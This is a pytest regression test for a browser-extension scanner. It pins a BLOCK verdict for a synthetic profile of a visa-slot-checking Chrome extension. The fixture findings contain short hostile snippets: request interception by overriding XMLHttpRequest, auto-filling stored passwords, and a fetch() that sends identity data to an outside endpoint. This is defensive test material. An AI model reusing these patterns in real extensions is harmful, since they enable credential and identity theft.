"""
Golden regression fixture: CheckVisaSlots v4.7.1 must reach BLOCK.

This pins the BLOCK outcome (and the three driving detections) for a real-world
malicious pattern: a Chrome extension that automates the U.S. visa-scheduling
portal and exfiltrates sensitive identity data.

SAFETY / DETERMINISM:
- The signal pack below is fully SYNTHETIC. It mirrors the *shape* of the public
  CheckVisaSlots manifest and the *categories* of behavior found by static review.
- No live portal calls, no real credentials, no real user data, no network access.
- SAST "findings" are descriptive placeholders, not copied source.

Asserted detections (name-tolerant so this survives the P3 rulepack rename):
- automation / terms-of-service:  TOS_VIOLATION  (a.k.a. PROTECTED_SERVICE_AUTOMATION)
- purpose mismatch:               PURPOSE_MISMATCH
- sensitive identity exfiltration: SENSITIVE_EXFIL (a.k.a. SENSITIVE_IDENTITY_EXFIL)
"""

import pytest

from extension_shield.governance.signal_pack import (
    NetworkSignalPack,
    PermissionsSignalPack,
    SastFindingNormalized,
    SastSignalPack,
    SignalPack,
    WebstoreStatsSignalPack,
)
from extension_shield.scoring.engine import ScoringEngine
from extension_shield.scoring.gates import HardGates
from extension_shield.scoring.models import Decision

# Name aliases bridging current gate IDs to the audit's target names.
AUTOMATION_GATES = {"TOS_VIOLATION", "PROTECTED_SERVICE_AUTOMATION"}
PURPOSE_GATES = {"PURPOSE_MISMATCH"}
EXFIL_GATES = {"SENSITIVE_EXFIL", "SENSITIVE_IDENTITY_EXFIL"}

CHECKVISASLOTS_EXTENSION_ID = "beepaenfejnphdgnkmccjcfiieihhogl"


def _checkvisaslots_manifest() -> dict:
    """Public manifest shape (no secrets) for CheckVisaSlots v4.7.1."""
    return {
        "name": "Check US Visa Slots - USVisaScheduling",
        "description": "Check & share the US visa slots availability.",
        "manifest_version": 3,
        "version": "4.7.1",
        "permissions": ["storage", "activeTab", "scripting"],
        "host_permissions": ["https://*.usvisascheduling.com/*"],
        "content_scripts": [
            {
                "js": ["js/html2canvas.js", "js/content.js"],
                "matches": [
                    "https://*.usvisascheduling.com/*/*",
                    "https://atlasauth.b2clogin.com/*",
                ],
            }
        ],
        "externally_connectable": {"matches": ["https://*.checkvisaslots.com/*"]},
    }


def _checkvisaslots_signal_pack() -> SignalPack:
    """Synthetic signal pack mirroring CheckVisaSlots behavior categories."""
    # Descriptive (non-source) SAST findings for each observed behavior category.
    findings = [
        SastFindingNormalized(
            check_id="credential.theft.password_input_hooks",
            file_path="js/content.js",
            line_number=1,
            severity="HIGH",
            message="Writes stored username/password into login form fields on the auth page",
            code_snippet="loginDetails: fills #signInName and #password on b2clogin login",
        ),
        SastFindingNormalized(
            check_id="credential.theft.form_serialization",
            file_path="js/content.js",
            line_number=2,
            severity="HIGH",
            message="Auto-fills security question answers during login",
            code_snippet="securityQuestions auto-fill then click continue",
        ),
        SastFindingNormalized(
            check_id="screenshot-capture",
            file_path="js/content.js",
            line_number=3,
            severity="HIGH",
            message="html2canvas screenshot of appointment page, exported via toDataURL",
            code_snippet="html2canvas(...).then(c => c.toDataURL('image/png'))",
        ),
        SastFindingNormalized(
            check_id="banking.net_sniff.override_fetch_xhr",
            file_path="js/page.js",
            line_number=4,
            severity="HIGH",
            message="Overrides XMLHttpRequest.prototype.open/send to intercept portal API",
            code_snippet="XMLHttpRequest.prototype.send = function(...)",
        ),
        SastFindingNormalized(
            check_id="c2.exfiltration.url_and_userid",
            file_path="js/sw.js",
            line_number=5,
            severity="HIGH",
            message="fetch() sends identity/appointment data to an external third-party endpoint",
            code_snippet="fetch('https://app.checkvisaslots.com/push/v5', {body: form})",
        ),
    ]

    pack = SignalPack(
        scan_id="checkvisaslots-v4-7-1",
        extension_id=CHECKVISASLOTS_EXTENSION_ID,
        sast=SastSignalPack(deduped_findings=findings, files_scanned=8, confidence=0.9),
        permissions=PermissionsSignalPack(
            api_permissions=["storage", "activeTab", "scripting"],
            host_permissions=["https://*.usvisascheduling.com/*"],
            has_broad_host_access=False,
            total_permissions=4,
        ),
        network=NetworkSignalPack(
            enabled=True,
            domains=["app.checkvisaslots.com"],
            suspicious_flags={"credential_exfil_pattern": True, "data_harvest_pattern": True},
            confidence=0.8,
        ),
        # No privacy policy is part of why SENSITIVE_EXFIL fires.
        webstore_stats=WebstoreStatsSignalPack(
            installs=200000, rating_avg=4.5, has_privacy_policy=False
        ),
    )
    return pack


@pytest.fixture(scope="module")
def gate_results():
    pack = _checkvisaslots_signal_pack()
    return HardGates().evaluate_all(pack, _checkvisaslots_manifest())


def _triggered(gate_results, ids: set) -> bool:
    return any(g.triggered and g.gate_id in ids for g in gate_results)


class TestCheckVisaSlotsBlock:
    def test_overall_verdict_is_block(self):
        pack = _checkvisaslots_signal_pack()
        result = ScoringEngine().calculate_scores(pack, _checkvisaslots_manifest())
        assert result.decision == Decision.BLOCK
        # Not flagged as insufficient data - we have real coverage here.
        assert result.insufficient_data is False

    def test_automation_tos_gate_blocks(self, gate_results):
        assert _triggered(gate_results, AUTOMATION_GATES)
        gate = next(g for g in gate_results if g.gate_id in AUTOMATION_GATES and g.triggered)
        assert gate.decision == "BLOCK"

    def test_purpose_mismatch_gate_triggers(self, gate_results):
        assert _triggered(gate_results, PURPOSE_GATES)

    def test_sensitive_identity_exfil_gate_triggers(self, gate_results):
        assert _triggered(gate_results, EXFIL_GATES)

    def test_all_three_required_detections_present(self):
        pack = _checkvisaslots_signal_pack()
        result = ScoringEngine().calculate_scores(pack, _checkvisaslots_manifest())
        triggered = set(result.hard_gates_triggered)
        assert triggered & AUTOMATION_GATES, f"missing automation/TOS gate in {triggered}"
        assert triggered & PURPOSE_GATES, f"missing purpose-mismatch gate in {triggered}"
        assert triggered & EXFIL_GATES, f"missing sensitive-exfil gate in {triggered}"
